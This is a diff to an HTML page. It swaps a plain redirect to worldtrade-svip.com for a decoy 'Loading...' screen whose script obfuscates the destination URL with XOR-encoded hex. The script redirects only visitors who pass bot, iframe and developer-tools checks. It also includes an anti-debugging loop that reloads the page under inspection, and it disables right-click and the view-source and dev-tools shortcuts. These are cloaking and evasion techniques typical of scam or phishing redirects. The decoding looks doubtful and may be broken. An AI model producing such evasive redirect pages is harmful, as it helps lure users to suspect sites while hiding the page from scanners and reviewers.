@@ -2,13 +2,172 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Redirecting...</title>
-    <script>
-   
-        window.location.href = "https://worldtrade-svip.com/";
-    </script>
+    <title>Loading...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #ffffff;
+            color: #333;
+            font-family: Arial, sans-serif;
+        }
+
+        .loader-container {
+            text-align: center;
+        }
+
+        .loader {
+            width: 120px;
+            height: 120px;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .circle {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 4px solid transparent;
+            border-radius: 50%;
+            animation: rotate 2s linear infinite;
+        }
+
+        .circle-outer {
+            border-top-color: #3498db;
+            animation-delay: -0.5s;
+        }
+
+        .circle-middle {
+            border-right-color: #e74c3c;
+            width: 80%;
+            height: 80%;
+            top: 10%;
+            left: 10%;
+            animation-delay: -0.375s;
+        }
+
+        .circle-inner {
+            border-bottom-color: #2ecc71;
+            width: 60%;
+            height: 60%;
+            top: 20%;
+            left: 20%;
+            animation-delay: -0.25s;
+        }
+
+        .loading-text {
+            font-size: 18px;
+            letter-spacing: 2px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .progress {
+            width: 160px;
+            height: 4px;
+            background: #eee;
+            border-radius: 2px;
+            margin: 20px auto;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            position: absolute;
+            width: 40%;
+            height: 100%;
+            background: linear-gradient(90deg, #3498db, #2ecc71);
+            border-radius: 2px;
+            animation: progress 2s ease-in-out infinite;
+        }
+
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        @keyframes progress {
+            0% { left: -40%; }
+            100% { left: 100%; }
+        }
+    </style>
 </head>
 <body>
-   
+    <div class="loader-container">
+        <div class="loader">
+            <div class="circle circle-outer"></div>
+            <div class="circle circle-middle"></div>
+            <div class="circle circle-inner"></div>
+        </div>
+        <div class="loading-text">LOADING...</div>
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const _k = 'sk_8f4h2m9p7q';  
+            
+            const _f = [
+                '3f4a2e1b7d8c',  
+                '9c5b3e2a1f8d',
+                '7d4e2b1a9f8c',
+                '5e3b2a1f8d4c'
+            ];
+
+            function _d(e, k) {
+                try {
+                    const h = s => s.match(/.{1,2}/g).map(x => parseInt(x, 16));
+                    const c = s => s.split('').map(x => x.charCodeAt(0));
+                    const r = (n, k) => c(k).reduce((a,b) => a ^ b, n);
+                    return h(e).map(x => r(x, k)).map(x => String.fromCharCode(x)).join('');
+                } catch(e) {
+                    return '';
+                }
+            }
+
+            function _v() {
+                const t = {
+                    w: !!(window.top === window.self),
+                    d: !document.hidden,
+                    h: window.outerHeight - window.innerHeight < 200,
+                    n: !navigator.webdriver
+                };
+                return Object.values(t).every(x => x);
+            }
+
+            setTimeout(() => {
+                if(_v()) {
+                    const u = _d(_f.join(''), _k);
+                    if(u.includes('worldtrade-svip.com')) {
+                        document.body.style.opacity = '0';
+                        setTimeout(() => {
+                            window.location.href = u;
+                        }, 300);
+                    }
+                }
+            }, 2000);
+            setInterval(() => {
+                const s = performance.now();
+                debugger;
+                if(performance.now() - s > 100) location.reload();
+            }, 100);
+
+            window.addEventListener('contextmenu', e => e.preventDefault());
+            window.addEventListener('keydown', e => {
+                if(e.ctrlKey && [67,73,74,75,83,85].includes(e.keyCode)) {
+                    e.preventDefault();
+                }
+            });
+        })();
+    </script>
 </body>
 </html>
